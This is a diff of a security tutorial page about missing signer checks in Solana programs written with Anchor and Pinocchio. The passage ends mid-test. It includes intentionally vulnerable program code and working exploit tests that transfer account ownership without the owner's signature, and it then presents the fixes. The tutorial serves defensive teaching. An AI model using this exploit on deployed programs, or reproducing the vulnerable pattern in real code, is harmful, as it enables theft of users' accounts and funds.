@@ -1,358 +1,1162 @@
 ---
 title: "Missing Signer Checks"
-description: "How missing signer validation allows unauthorized operations"
+description: "How missing signer validation enables unauthorized ownership transfer on Solana programs"
 icon: "signature"
 ---
 
+What happens when your program doesn't verify who signed the transaction?
+
+A missing signer check means we accept an account's public key without verifying that the corresponding private key actually signed the transaction. Anyone who can read on-chain data -- which is everyone -- can pass the owner's public key into the instruction and the program will happily overwrite ownership. No signature required.
+
+## What we will build
+
+In this tutorial we will:
+
+- Write a vulnerable Anchor program that accepts ownership transfers without verifying signatures, then exploit it in a test
+- Fix the vulnerability with a single type change (`UncheckedAccount` to `Signer`) and confirm the exploit no longer works
+- Reproduce the same vulnerability and fix at the raw Pinocchio level, where we must call `is_signer()` ourselves
+
 <Note>
-**🔴 Security Matrix: Account Validation (Top Right)**
+**Prerequisites** -- Before starting, clone the repository and install dependencies:
 
-**Frequency:** Common | **Impact:** Critical
+```bash
+git clone https://github.com/danielAsaboro/solana_badger.git
+cd solana_badger
+npm install
+anchor build
+```
 
-*Where most money gets lost. Focus here first.*
+You will need Rust, the Solana CLI, and Anchor installed. See the [Solana docs](https://solana.com/docs) if you need to set these up.
 </Note>
 
-# Missing Signer Checks
+## The vulnerable program -- Anchor
 
-<CardGroup cols={2}>
-  <Card title="Severity" icon="exclamation-triangle">
-    **Critical** - Allows unauthorized account modifications
-  </Card>
-  <Card title="Difficulty" icon="gauge">
-    **Beginner** - Easy to understand and fix
-  </Card>
-</CardGroup>
-
-## Overview
-
-<Warning>
-This is the **#1 most common** Solana security vulnerability. Always validate signers!
-</Warning>
-
-Missing signer checks occur when programs accept accounts without verifying the transaction was actually signed by the account owner. This allows attackers to modify accounts they don't control.
-
-## Attack Flow Diagram
-
-```mermaid
-sequenceDiagram
-    participant Attacker
-    participant Program
-    participant VictimAccount
-
-    Attacker->>Program: Call update_owner(victim_pubkey, attacker_pubkey)
-    Note over Attacker: NO signature from victim!
-    Program->>VictimAccount: Update owner field
-    VictimAccount-->>Attacker: Ownership transferred!
-    Note over Program: VULNERABILITY: No signer check
-```
-
-## The Vulnerability
-
-<Tabs>
-  <Tab title="Anchor">
-    ### Vulnerable Implementation
-
-    ```rust filename="programs/signer-checks/vulnerable/anchor/src/lib.rs"
-    use anchor_lang::prelude::*;
-
-    #[program]
-    pub mod vulnerable_signer {
-        use super::*;
-
-        // VULNERABILITY: owner is UncheckedAccount - no signer validation!
-        pub fn update_owner(ctx: Context<UpdateOwnership>) -> Result<()> {
-            ctx.accounts.program_account.owner = ctx.accounts.new_owner.key();
-            Ok(())
-        }
-    }
-
-    #[derive(Accounts)]
-    pub struct UpdateOwnership<'info> {
-        // VULNERABILITY: This accepts ANY public key, doesn't verify signature
-        /// CHECK: INTENTIONALLY VULNERABLE
-        pub owner: UncheckedAccount<'info>,
-
-        #[account(mut, has_one = owner)]
-        pub program_account: Account<'info, ProgramAccount>,
-
-        /// CHECK: This is the new owner being set
-        pub new_owner: UncheckedAccount<'info>,
-    }
-
-    #[account]
-    pub struct ProgramAccount {
-        pub owner: Pubkey,
-    }
-    ```
-
-    <Accordion title="Why is this vulnerable?">
-      The `UncheckedAccount` type doesn't validate signatures. An attacker can:
-      1. Read the current owner's pubkey from the account data
-      2. Pass that pubkey as the `owner` parameter
-      3. Execute the transaction WITHOUT the owner's signature
-      4. The `has_one = owner` check passes (data matches), but no signature verified!
-    </Accordion>
-  </Tab>
-
-  <Tab title="Pinocchio">
-    ### Vulnerable Implementation
-
-    ```rust filename="programs/signer-checks/vulnerable/pinocchio/src/lib.rs"
-    fn update_owner(accounts: &[AccountInfo]) -> ProgramResult {
-        let [owner_info, program_account_info, new_owner_info] = accounts else {
-            return Err(ProgramError::NotEnoughAccountKeys);
-        };
-
-        // Read stored owner from account data
-        let stored_owner = Pubkey::from(/* ... */);
-
-        // VULNERABILITY: Checks data matches but NOT that owner signed!
-        if stored_owner != *owner_info.key() {
-            return Err(ProgramError::InvalidAccountData);
-        }
-
-        // MISSING: Should check owner_info.is_signer() here!
-
-        // Update owner in account data
-        data[1..33].copy_from_slice(new_owner_info.key().as_ref());
-        Ok(())
-    }
-    ```
-
-    <Info>
-    **Key Difference:** Pinocchio requires explicit `is_signer()` checks. Forgetting this check is easy and dangerous!
-    </Info>
-  </Tab>
-</Tabs>
-
-## Real-World Exploit Demo
-
-<Steps>
-  <Step title="Setup victim account">
-    Create an account owned by Alice with valuable state/permissions
-  </Step>
-  <Step title="Attacker reads on-chain data">
-    Attacker queries the account and reads Alice's pubkey from account data
-  </Step>
-  <Step title="Execute attack transaction">
-    Attacker crafts transaction passing Alice's pubkey but doesn't obtain her signature
-  </Step>
-  <Step title="Ownership stolen">
-    Program updates owner field to attacker's address - Alice loses control!
-  </Step>
-</Steps>
+We split the program across three files: entrypoint dispatch in `lib.rs`, the instruction handler in `instructions/update_owner.rs`, and account state in `state.rs`.
 
 <CodeGroup>
-```typescript Test: Exploit Works
-// tests/signer-checks.test.ts
-it("should allow attacker to steal ownership", async () => {
-  // Alice creates her account
-  await program.methods.initialize()
-    .accounts({ owner: alice.publicKey })
-    .signers([alice])
-    .rpc();
+```rust lib.rs
+use anchor_lang::prelude::*;
 
-  // Attacker steals it WITHOUT Alice's signature!
-  await program.methods.updateOwner()
-    .accounts({
-      owner: alice.publicKey,          // Attacker passes Alice's key
-      newOwner: attacker.publicKey,    // But signs with attacker's key
-    })
-    .signers([attacker])               // Alice didn't sign!
-    .rpc();
+declare_id!("6aMtrYT8eeCbtvtfcAEiUfkQAZ9MHVgRipAFKgddC3TD");
 
-  // Attacker now owns Alice's account
-  const account = await program.account.programAccount.fetch(aliceAccountPda);
-  expect(account.owner).toEqual(attacker.publicKey);
-});
+pub mod instructions;
+pub mod state;
+
+pub use instructions::*;
+pub use state::*;
+
+#[program]
+pub mod vulnerable_signer_checks {
+    use super::*;
+
+    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
+        instructions::initialize(ctx)
+    }
+
+    pub fn update_owner(ctx: Context<UpdateOwnership>) -> Result<()> {
+        instructions::update_owner(ctx)
+    }
+}
 ```
 
-```bash Expected Output
-✓ should allow attacker to steal ownership (234ms)
+```rust instructions/update_owner.rs
+use anchor_lang::prelude::*;
+use crate::state::ProgramAccount;
 
-⚠️  VULNERABILITY CONFIRMED: Exploit succeeded
+/// Updates the owner without verifying the current owner signed the transaction.
+pub fn update_owner(ctx: Context<UpdateOwnership>) -> Result<()> {
+    let program_account = &mut ctx.accounts.program_account;
+    let old_owner = program_account.owner;
+
+    program_account.owner = ctx.accounts.new_owner.key();
+
+    msg!("Owner updated from {} to {}", old_owner, program_account.owner);
+    Ok(())
+}
+
+#[derive(Accounts)]
+pub struct UpdateOwnership<'info> {
+    // VULNERABILITY: UncheckedAccount accepts any pubkey without verifying a signature.
+    /// CHECK: INTENTIONALLY VULNERABLE - This should be a Signer but isn't!
+    pub owner: UncheckedAccount<'info>,
+
+    #[account(
+        mut,
+        has_one = owner,
+        seeds = [b"program-account", owner.key().as_ref()],
+        bump
+    )]
+    pub program_account: Account<'info, ProgramAccount>,
+
+    /// CHECK: This is the new owner being set, no validation needed
+    pub new_owner: UncheckedAccount<'info>,
+}
+```
+
+```rust state.rs
+use anchor_lang::prelude::*;
+
+#[account]
+pub struct ProgramAccount {
+    pub owner: Pubkey,
+    pub data: u64,
+}
+
+impl ProgramAccount {
+    /// 8 bytes discriminator + 32 bytes pubkey + 8 bytes u64
+    pub const LEN: usize = 8 + 32 + 8;
+}
 ```
 </CodeGroup>
 
-## The Fix
+The vulnerability lives on one line of `update_owner.rs`:
+
+```rust
+pub owner: UncheckedAccount<'info>,
+```
+
+`UncheckedAccount` tells Anchor "trust whatever public key the caller passes." The `has_one = owner` constraint on `program_account` only verifies that the stored owner field *matches* the key passed in -- it never checks whether that key actually *signed* the transaction. We can read the owner's public key from on-chain data, pass it in, and the constraint is satisfied.
+
+## Exploiting it
+
+We construct a raw transaction where Alice's public key is passed as the `owner` account but `isSigner` is set to `false`. Only the attacker signs.
+
+<CodeGroup>
+```typescript tests/signer-checks.test.ts
+import * as anchor from "@coral-xyz/anchor";
+import { PublicKey, Keypair, SystemProgram, Transaction } from "@solana/web3.js";
+import { assert } from "chai";
+import type { VulnerableSignerChecks } from "../target/types/vulnerable_signer_checks";
+import type { SecureSignerChecks } from "../target/types/secure_signer_checks";
+
+describe("Vulnerability: Missing Signer Checks", () => {
+  const provider = anchor.AnchorProvider.env();
+  anchor.setProvider(provider);
+
+  const vulnerableProgram: anchor.Program<VulnerableSignerChecks> =
+    anchor.workspace.VulnerableSignerChecks;
+  const secureProgram: anchor.Program<SecureSignerChecks> =
+    anchor.workspace.SecureSignerChecks;
+
+  let alice: Keypair;
+  let attacker: Keypair;
+  let aliceAccountVuln: PublicKey;
+  let aliceAccountSecure: PublicKey;
+
+  before(async () => {
+    alice = Keypair.generate();
+    attacker = Keypair.generate();
+
+    const airdropAmount = 2 * anchor.web3.LAMPORTS_PER_SOL;
+
+    const aliceAirdrop = await provider.connection.requestAirdrop(
+      alice.publicKey,
+      airdropAmount
+    );
+    await provider.connection.confirmTransaction(aliceAirdrop);
+
+    const attackerAirdrop = await provider.connection.requestAirdrop(
+      attacker.publicKey,
+      airdropAmount
+    );
+    await provider.connection.confirmTransaction(attackerAirdrop);
+
+    [aliceAccountVuln] = PublicKey.findProgramAddressSync(
+      [Buffer.from("program-account"), alice.publicKey.toBuffer()],
+      vulnerableProgram.programId
+    );
+
+    [aliceAccountSecure] = PublicKey.findProgramAddressSync(
+      [Buffer.from("program-account"), alice.publicKey.toBuffer()],
+      secureProgram.programId
+    );
+
+    console.log("      Setup complete:");
+    console.log("      Alice:", alice.publicKey.toBase58());
+    console.log("      Attacker:", attacker.publicKey.toBase58());
+    console.log("      Vulnerable Account PDA:", aliceAccountVuln.toBase58());
+    console.log("      Secure Account PDA:", aliceAccountSecure.toBase58());
+  });
+
+  describe("Vulnerable Implementation (Anchor)", () => {
+    it("allows attacker to steal ownership WITHOUT victim's signature", async () => {
+      console.log("\n      EXPLOIT DEMONSTRATION:");
+
+      // Step 1: Alice initializes her account
+      console.log("      1. Alice initializes her account...");
+      await vulnerableProgram.methods
+        .initialize()
+        .accounts({
+          owner: alice.publicKey,
+          programAccount: aliceAccountVuln,
+          systemProgram: SystemProgram.programId,
+        })
+        .signers([alice])
+        .rpc();
+
+      console.log("      Alice's account initialized");
+
+      const accountData = await vulnerableProgram.account.programAccount.fetch(
+        aliceAccountVuln
+      );
+      assert.ok(
+        accountData.owner.equals(alice.publicKey),
+        "Alice should be the initial owner"
+      );
+      console.log("      Verified: Alice is the owner");
+
+      // Step 2: Attacker changes ownership without Alice's signature
+      console.log(
+        "\n      2. ATTACK: Attacker calls update_owner with Alice's key but NO signature"
+      );
+      console.log("         Attacker passes Alice's pubkey as 'owner' parameter");
+      console.log("         But Alice does NOT sign the transaction!");
+
+      const ix = await vulnerableProgram.methods
+        .updateOwner()
+        .accounts({
+          owner: alice.publicKey,
+          programAccount: aliceAccountVuln,
+          newOwner: attacker.publicKey,
+        })
+        .instruction();
+
+      // Flip the owner account's isSigner flag to false
+      ix.keys.find(k => k.pubkey.equals(alice.publicKey))!.isSigner = false;
+
+      const tx = new Transaction().add(ix);
+      tx.feePayer = attacker.publicKey;
+      tx.recentBlockhash = (await provider.connection.getLatestBlockhash()).blockhash;
+      tx.sign(attacker);
+
+      const txSig = await provider.connection.sendRawTransaction(tx.serialize());
+      await provider.connection.confirmTransaction(txSig);
+
+      console.log("      VULNERABILITY CONFIRMED: Transaction succeeded without Alice's signature!");
+
+      // Step 3: Verify the attacker now owns the account
+      const exploitedAccount = await vulnerableProgram.account.programAccount.fetch(
+        aliceAccountVuln
+      );
+
+      assert.ok(
+        exploitedAccount.owner.equals(attacker.publicKey),
+        "Attacker should now own the account (exploit successful)"
+      );
+      console.log("      Alice's account has been stolen by the attacker!");
+      console.log(
+        "      New owner:",
+        exploitedAccount.owner.toBase58(),
+        "(Attacker)"
+      );
+    });
+  });
+
+  describe("Secure Implementation (Anchor)", () => {
+    it("prevents attacker from stealing ownership - requires victim's signature", async () => {
+      console.log("\n      FIX DEMONSTRATION:");
+
+      // Step 1: Alice initializes her account (secure version)
+      console.log("      1. Alice initializes her account (secure version)...");
+      await secureProgram.methods
+        .initialize()
+        .accounts({
+          owner: alice.publicKey,
+          programAccount: aliceAccountSecure,
+          systemProgram: SystemProgram.programId,
+        })
+        .signers([alice])
+        .rpc();
+
+      console.log("      Alice's account initialized (secure version)");
+
+      const accountData = await secureProgram.account.programAccount.fetch(
+        aliceAccountSecure
+      );
+      assert.ok(
+        accountData.owner.equals(alice.publicKey),
+        "Alice should be the owner"
+      );
+      console.log("      Verified: Alice is the owner");
+
+      // Step 2: Attacker attempts the same exploit
+      console.log(
+        "\n      2. ATTACK ATTEMPT: Attacker tries same exploit on secure program"
+      );
+      console.log("         Attacker passes Alice's pubkey without her signature");
+
+      let exploitFailed = false;
+      let errorMessage = "";
+
+      try {
+        await secureProgram.methods
+          .updateOwner()
+          .accounts({
+            owner: alice.publicKey,
+            programAccount: aliceAccountSecure,
+            newOwner: attacker.publicKey,
+          })
+          .signers([attacker])
+          .rpc();
+
+        assert.fail("Expected transaction to fail, but it succeeded!");
+      } catch (error: any) {
+        exploitFailed = true;
+        errorMessage = error.toString();
+        console.log("      FIX CONFIRMED: Transaction rejected");
+        console.log("      Error:", errorMessage);
+
+        const errorMsg = errorMessage.toLowerCase();
+        const hasSignatureError =
+          errorMsg.includes("signature") ||
+          errorMsg.includes("signer") ||
+          errorMsg.includes("unknown") ||
+          errorMsg.includes("not found");
+
+        assert.ok(
+          hasSignatureError,
+          `Error should mention missing signature. Got: ${errorMessage}`
+        );
+      }
+
+      assert.ok(exploitFailed, "Transaction should have failed");
+
+      // Step 3: Verify Alice still owns the account
+      const stillSecureAccount = await secureProgram.account.programAccount.fetch(
+        aliceAccountSecure
+      );
+
+      assert.ok(
+        stillSecureAccount.owner.equals(alice.publicKey),
+        "Alice should still own her account (exploit prevented)"
+      );
+      console.log("      Alice's account is secure!");
+      console.log(
+        "      Owner still:",
+        stillSecureAccount.owner.toBase58(),
+        "(Alice)"
+      );
+    });
+  });
+
+  describe("Summary", () => {
+    it("demonstrates the critical difference between vulnerable and secure implementations", () => {
+      console.log("\n      VULNERABILITY SUMMARY:");
+      console.log("      ");
+      console.log(
+        "      VULNERABLE: Uses UncheckedAccount without signer validation"
+      );
+      console.log(
+        "         -> Attacker can pass any pubkey without signature"
+      );
+      console.log(
+        "         -> has_one constraint only checks data, NOT signatures"
+      );
+      console.log("         -> Result: Unauthorized ownership transfer");
+      console.log("      ");
+      console.log(
+        "      SECURE: Uses Signer<'info> type for automatic validation"
+      );
+      console.log(
+        "         -> Anchor enforces signature verification automatically"
+      );
+      console.log("         -> Transaction fails if signer doesn't sign");
+      console.log("         -> Result: Attack prevented");
+      console.log("      ");
+      console.log("      KEY LESSON:");
+      console.log(
+        "         Always use Signer<'info> for accounts that authorize actions!"
+      );
+      console.log(
+        "         Data validation (has_one) != Signature validation (Signer)"
+      );
+    });
+  });
+});
+```
+</CodeGroup>
+
+The critical trick is on line 110:
+
+```typescript
+ix.keys.find(k => k.pubkey.equals(alice.publicKey))!.isSigner = false;
+```
+
+We build the instruction, then manually flip the owner account's `isSigner` flag to `false` before submitting. Because the on-chain program uses `UncheckedAccount`, it never notices. We pay the fee as the attacker, Alice never signs, and ownership transfers.
+
+You will see output like this from the vulnerable test:
+
+```
+EXPLOIT DEMONSTRATION:
+1. Alice initializes her account...
+   Alice's account initialized
+   Verified: Alice is the owner
+
+2. ATTACK: Attacker calls update_owner with Alice's key but NO signature
+   Attacker passes Alice's pubkey as 'owner' parameter
+   But Alice does NOT sign the transaction!
+   VULNERABILITY CONFIRMED: Transaction succeeded without Alice's signature!
+   Alice's account has been stolen by the attacker!
+   New owner: <attacker pubkey> (Attacker)
+```
+
+Notice that the transaction succeeds even though Alice never signed. The `has_one` constraint passed because the public key *matched* -- but matching is not signing.
+
+## The fix -- Anchor
+
+We change exactly one type: `UncheckedAccount<'info>` becomes `Signer<'info>`.
+
+<CodeGroup>
+```rust instructions/update_owner.rs (secure)
+use anchor_lang::prelude::*;
+use crate::state::ProgramAccount;
+
+/// Updates the owner with proper signer validation.
+pub fn update_owner(ctx: Context<UpdateOwnership>) -> Result<()> {
+    let program_account = &mut ctx.accounts.program_account;
+    let old_owner = program_account.owner;
+
+    program_account.owner = ctx.accounts.new_owner.key();
+
+    msg!("Owner updated from {} to {}", old_owner, program_account.owner);
+    Ok(())
+}
+
+#[derive(Accounts)]
+pub struct UpdateOwnership<'info> {
+    // FIX: Signer<'info> ensures this account signed the transaction.
+    pub owner: Signer<'info>,
+
+    #[account(
+        mut,
+        has_one = owner,
+        seeds = [b"program-account", owner.key().as_ref()],
+        bump
+    )]
+    pub program_account: Account<'info, ProgramAccount>,
+
+    /// CHECK: This is the new owner being set, no validation needed
+    pub new_owner: UncheckedAccount<'info>,
+}
+```
+
+```rust lib.rs (secure)
+use anchor_lang::prelude::*;
+
+declare_id!("9KLc9xT6Ub25gpr5QvJbcJC2kEH6zCWSEF9s1ZDj7pPb");
+
+pub mod instructions;
+pub mod state;
+
+pub use instructions::*;
+pub use state::*;
+
+#[program]
+pub mod secure_signer_checks {
+    use super::*;
+
+    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
+        instructions::initialize(ctx)
+    }
+
+    pub fn update_owner(ctx: Context<UpdateOwnership>) -> Result<()> {
+        instructions::update_owner(ctx)
+    }
+}
+```
+</CodeGroup>
+
+The diff that matters:
+
+```diff
+- /// CHECK: INTENTIONALLY VULNERABLE - This should be a Signer but isn't!
+- pub owner: UncheckedAccount<'info>,
++ pub owner: Signer<'info>,
+```
+
+`Signer<'info>` wraps the same public key, but Anchor's deserialization layer now calls `is_signer` on the underlying `AccountInfo` before the instruction body ever runs. If the flag is `false`, the transaction aborts with a signature error.
+
+You will see the secure test reject the attack:
+
+```
+FIX DEMONSTRATION:
+1. Alice initializes her account (secure version)...
+   Verified: Alice is the owner
+
+2. ATTACK ATTEMPT: Attacker tries same exploit on secure program
+   Attacker passes Alice's pubkey without her signature
+   FIX CONFIRMED: Transaction rejected
+   Error: ... unknown signer / missing signature ...
+
+   Alice's account is secure!
+   Owner still: <alice pubkey> (Alice)
+```
+
+Notice that the transaction is rejected before the instruction body runs. Anchor enforces the signer constraint at deserialization time.
+
+## The vulnerable program -- Pinocchio
+
+Without a framework doing checks for us, every validation is our responsibility. Notice that `initialize` correctly calls `is_signer()`, but `update_owner` does not.
+
+```rust programs/signer-checks/vulnerable/pinocchio/src/lib.rs
+#![no_std]
+
+#[cfg(not(feature = "no-entrypoint"))]
+#[panic_handler]
+fn panic(_info: &core::panic::PanicInfo) -> ! {
+    loop {}
+}
+
+use pinocchio::{
+    entrypoint,
+    AccountView,
+    Address,
+    ProgramResult,
+};
+use solana_program_error::ProgramError;
+
+pub mod state;
+use state::ProgramAccount;
+
+const ID: Address = Address::new_from_array([
+    0xd1, 0x6c, 0x7e, 0x1f, 0x8a, 0xb3, 0x4c, 0x5d,
+    0xe9, 0x2a, 0x1b, 0xf6, 0xc3, 0x7d, 0x4e, 0x8f,
+    0xa5, 0xb6, 0xc7, 0xd8, 0xe9, 0xfa, 0x0b, 0x1c,
+    0x2d, 0x3e, 0x4f, 0x50, 0x61, 0x72, 0x83, 0x01,
+]);
+
+entrypoint!(process_instruction);
+
+pub fn process_instruction(
+    program_id: &Address,
+    accounts: &[AccountView],
+    instruction_data: &[u8],
+) -> ProgramResult {
+    if program_id != &ID {
+        return Err(ProgramError::IncorrectProgramId);
+    }
+
+    match instruction_data.first() {
+        Some(&0) => initialize(accounts),
+        Some(&1) => update_owner(accounts),
+        _ => Err(ProgramError::InvalidInstructionData),
+    }
+}
+
+fn initialize(accounts: &[AccountView]) -> ProgramResult {
+    let [owner_info, program_account_info, _system_program] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !owner_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    if !program_account_info.owned_by(&ID) {
+        return Err(ProgramError::InvalidAccountOwner);
+    }
+
+    let mut data = program_account_info.try_borrow_mut()?;
+
+    if data.len() < ProgramAccount::LEN {
+        return Err(ProgramError::AccountDataTooSmall);
+    }
+
+    data[0] = 1; // Initialized flag
+    data[1..33].copy_from_slice(owner_info.address().as_ref());
+    data[33..41].fill(0);
+
+    Ok(())
+}
+
+/// VULNERABLE: checks data match but never calls owner_info.is_signer()
+fn update_owner(accounts: &[AccountView]) -> ProgramResult {
+    let [owner_info, program_account_info, new_owner_info] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !program_account_info.owned_by(&ID) {
+        return Err(ProgramError::InvalidAccountOwner);
+    }
+
+    let mut data = program_account_info.try_borrow_mut()?;
+
+    if data.len() < ProgramAccount::LEN {
+        return Err(ProgramError::AccountDataTooSmall);
+    }
+
+    if data[0] != 1 {
+        return Err(ProgramError::UninitializedAccount);
+    }
+
+    let stored_owner = Address::new_from_array(<[u8; 32]>::try_from(&data[1..33]).unwrap());
+
+    // Data match -- but no is_signer() check!
+    if stored_owner != *owner_info.address() {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    data[1..33].copy_from_slice(new_owner_info.address().as_ref());
+
+    Ok(())
+}
+```
+
+We validate that `stored_owner == owner_info.address()` -- the data matches. But we never call `owner_info.is_signer()`. Data matching is not authorization. Anyone who can read the chain can supply the correct key.
+
+The Pinocchio exploit test drives this home with raw `TransactionInstruction` construction:
+
+<CodeGroup>
+```typescript tests/pinocchio/signer-checks.pinocchio.test.ts
+import { start } from "solana-bankrun";
+import {
+  Keypair,
+  PublicKey,
+  SystemProgram,
+  Transaction,
+  TransactionInstruction,
+} from "@solana/web3.js";
+import * as path from "path";
+import { assert } from "chai";
+
+/**
+ * Account Layout (41 bytes):
+ * - Byte 0: Initialized flag (1 = initialized)
+ * - Bytes 1-32: Owner public key (32 bytes)
+ * - Bytes 33-40: Data field (8 bytes, u64)
+ *
+ * Instructions:
+ * - 0: Initialize
+ * - 1: UpdateOwner
+ */
+
+const VULNERABLE_PROGRAM_ID = new PublicKey(
+  Buffer.from([
+    0xd1, 0x6c, 0x7e, 0x1f, 0x8a, 0xb3, 0x4c, 0x5d,
+    0xe9, 0x2a, 0x1b, 0xf6, 0xc3, 0x7d, 0x4e, 0x8f,
+    0xa5, 0xb6, 0xc7, 0xd8, 0xe9, 0xfa, 0x0b, 0x1c,
+    0x2d, 0x3e, 0x4f, 0x50, 0x61, 0x72, 0x83, 0x01,
+  ])
+);
+
+const SECURE_PROGRAM_ID = new PublicKey(
+  Buffer.from([
+    0xd1, 0x6c, 0x7e, 0x1f, 0x8a, 0xb3, 0x4c, 0x5d,
+    0xe9, 0x2a, 0x1b, 0xf6, 0xc3, 0x7d, 0x4e, 0x8f,
+    0xa5, 0xb6, 0xc7, 0xd8, 0xe9, 0xfa, 0x0b, 0x1c,
+    0x2d, 0x3e, 0x4f, 0x50, 0x61, 0x72, 0x83, 0x02,
+  ])
+);
+
+const ACCOUNT_SIZE = 41; // 1 + 32 + 8 bytes
+
+describe("Pinocchio: Missing Signer Checks", () => {
+  const alice = Keypair.generate();
+  const attacker = Keypair.generate();
+  const programAccount = Keypair.generate();
+  const programAccountSecure = Keypair.generate();
+
+  describe("Vulnerable Pinocchio Implementation", () => {
+    it("allows attacker to steal ownership WITHOUT victim's signature", async () => {
+      console.log("\n      EXPLOIT DEMONSTRATION (Pinocchio Vulnerable):");
+
+      const context = await start(
+        [
+          {
+            name: "vulnerable_signer_checks_pinocchio",
+            programId: VULNERABLE_PROGRAM_ID,
+          },
+        ],
+        []
+      );
+
+      const client = context.banksClient;
+      const payer = context.payer;
+
+      // Create and allocate the program account
+      console.log("      1. Creating program account...");
+      const rentExempt = await client.getRent();
+      const lamports = rentExempt.minimumBalance(BigInt(ACCOUNT_SIZE));
+
+      const createAccountIx = SystemProgram.createAccount({
+        fromPubkey: payer.publicKey,
+        newAccountPubkey: programAccount.publicKey,
+        lamports: Number(lamports),
+        space: ACCOUNT_SIZE,
+        programId: VULNERABLE_PROGRAM_ID,
+      });
+
+      let tx = new Transaction();
+      tx.recentBlockhash = context.lastBlockhash;
+      tx.feePayer = payer.publicKey;
+      tx.add(createAccountIx);
+      tx.sign(payer, programAccount);
+
+      await client.processTransaction(tx);
+      console.log("      Program account created");
+
+      // Alice initializes her account
+      console.log("      2. Alice initializes her account...");
+      const initIx = new TransactionInstruction({
+        programId: VULNERABLE_PROGRAM_ID,
+        keys: [
+          { pubkey: alice.publicKey, isSigner: true, isWritable: false },
+          { pubkey: programAccount.publicKey, isSigner: false, isWritable: true },
+          { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
+        ],
+        data: Buffer.from([0]),
+      });
+
+      tx = new Transaction();
+      tx.recentBlockhash = context.lastBlockhash;
+      tx.feePayer = payer.publicKey;
+      tx.add(initIx);
+      tx.sign(payer, alice);
+
+      await client.processTransaction(tx);
+      console.log("      Alice's account initialized");
+
+      let accountInfo = await client.getAccount(programAccount.publicKey);
+      let ownerKey = new PublicKey(accountInfo!.data.slice(1, 33));
+      assert.ok(ownerKey.equals(alice.publicKey), "Alice should be initial owner");
+      console.log("      Verified: Owner is Alice");
+
+      // Attack: steal ownership without Alice's signature
+      console.log("\n      3. ATTACK: Attacker calls update_owner...");
+      console.log("         - Passes Alice's pubkey (but Alice does NOT sign!)");
+      console.log("         - Passes Attacker's pubkey as new owner");
+
+      const attackIx = new TransactionInstruction({
+        programId: VULNERABLE_PROGRAM_ID,
+        keys: [
+          { pubkey: alice.publicKey, isSigner: false, isWritable: false },
+          { pubkey: programAccount.publicKey, isSigner: false, isWritable: true },
+          { pubkey: attacker.publicKey, isSigner: false, isWritable: false },
+        ],
+        data: Buffer.from([1]),
+      });
+
+      tx = new Transaction();
+      tx.recentBlockhash = context.lastBlockhash;
+      tx.feePayer = payer.publicKey;
+      tx.add(attackIx);
+      tx.sign(payer);
+
+      await client.processTransaction(tx);
+      console.log("      VULNERABILITY CONFIRMED: Transaction succeeded!");
+
+      accountInfo = await client.getAccount(programAccount.publicKey);
+      ownerKey = new PublicKey(accountInfo!.data.slice(1, 33));
+
+      assert.ok(ownerKey.equals(attacker.publicKey), "Attacker should now own the account");
+      console.log("      Account stolen! New owner:", ownerKey.toBase58());
+      console.log("      Original owner (Alice):", alice.publicKey.toBase58());
+    });
+  });
+
+  describe("Secure Pinocchio Implementation", () => {
+    it("prevents attacker from stealing ownership - requires victim's signature", async () => {
+      console.log("\n      FIX DEMONSTRATION (Pinocchio Secure):");
+
+      const context = await start(
+        [
+          {
+            name: "secure_signer_checks_pinocchio",
+            programId: SECURE_PROGRAM_ID,
+          },
+        ],
+        []
+      );
+
+      const client = context.banksClient;
+      const payer = context.payer;
+
+      console.log("      1. Creating program account...");
+      const rentExempt = await client.getRent();
+      const lamports = rentExempt.minimumBalance(BigInt(ACCOUNT_SIZE));
+
+      const createAccountIx = SystemProgram.createAccount({
+        fromPubkey: payer.publicKey,
+        newAccountPubkey: programAccountSecure.publicKey,
+        lamports: Number(lamports),
+        space: ACCOUNT_SIZE,
+        programId: SECURE_PROGRAM_ID,
+      });
+
+      let tx = new Transaction();
+      tx.recentBlockhash = context.lastBlockhash;
+      tx.feePayer = payer.publicKey;
+      tx.add(createAccountIx);
+      tx.sign(payer, programAccountSecure);
+
+      await client.processTransaction(tx);
+
+      console.log("      2. Alice initializes her account (secure version)...");
+      const initIx = new TransactionInstruction({
+        programId: SECURE_PROGRAM_ID,
+        keys: [
+          { pubkey: alice.publicKey, isSigner: true, isWritable: false },
+          { pubkey: programAccountSecure.publicKey, isSigner: false, isWritable: true },
+          { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
+        ],
+        data: Buffer.from([0]),
+      });
+
+      tx = new Transaction();
+      tx.recentBlockhash = context.lastBlockhash;
+      tx.feePayer = payer.publicKey;
+      tx.add(initIx);
+      tx.sign(payer, alice);
+
+      await client.processTransaction(tx);
+      console.log("      Alice's account initialized");
+
+      let accountInfo = await client.getAccount(programAccountSecure.publicKey);
+      let ownerKey = new PublicKey(accountInfo!.data.slice(1, 33));
+      assert.ok(ownerKey.equals(alice.publicKey), "Alice should be initial owner");
+
+      // Attack attempt -- should fail
+      console.log("\n      3. ATTACK ATTEMPT on secure program...");
+      console.log("         - Attacker tries to pass Alice's pubkey without signature");
+
+      const attackIx = new TransactionInstruction({
+        programId: SECURE_PROGRAM_ID,
+        keys: [
+          { pubkey: alice.publicKey, isSigner: false, isWritable: false },
+          { pubkey: programAccountSecure.publicKey, isSigner: false, isWritable: true },
+          { pubkey: attacker.publicKey, isSigner: false, isWritable: false },
+        ],
+        data: Buffer.from([1]),
+      });
+
+      tx = new Transaction();
+      tx.recentBlockhash = context.lastBlockhash;
+      tx.feePayer = payer.publicKey;
+      tx.add(attackIx);
+      tx.sign(payer);
+
+      let attackFailed = false;
+      try {
+        await client.processTransaction(tx);
+      } catch (error: any) {
+        attackFailed = true;
+        console.log("      FIX CONFIRMED: Transaction rejected!");
+        console.log("      Error: Missing required signature (is_signer check failed)");
+      }
+
+      assert.ok(attackFailed, "Attack should have failed");
+
+      accountInfo = await client.getAccount(programAccountSecure.publicKey);
+      ownerKey = new PublicKey(accountInfo!.data.slice(1, 33));
+
+      assert.ok(ownerKey.equals(alice.publicKey), "Alice should still own the account");
+      console.log("      Alice's account is secure! Owner:", ownerKey.toBase58());
+    });
+  });
+
+  describe("Summary", () => {
+    it("demonstrates Pinocchio signer check vulnerability", () => {
